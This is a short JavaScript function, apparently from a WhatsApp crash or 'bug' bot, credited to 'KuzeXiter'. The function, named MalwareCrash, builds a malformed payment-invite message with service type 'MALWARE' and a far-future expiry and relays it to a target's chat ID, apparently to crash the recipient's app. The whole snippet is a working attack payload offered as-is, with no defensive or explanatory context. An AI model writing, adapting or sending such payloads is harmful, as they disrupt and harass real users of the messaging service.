async function MalwareCrash(target) {
  const paymentMessage = {
    paymentInviteMessage: {
      serviceType: "MALWARE",
      expiryTimestamp: Date.now() + 1344038400000,
    }
  };

  await sock.relayMessage(target, paymentMessage, { participant: { jid: target }
  });
}
© KuzeXiter
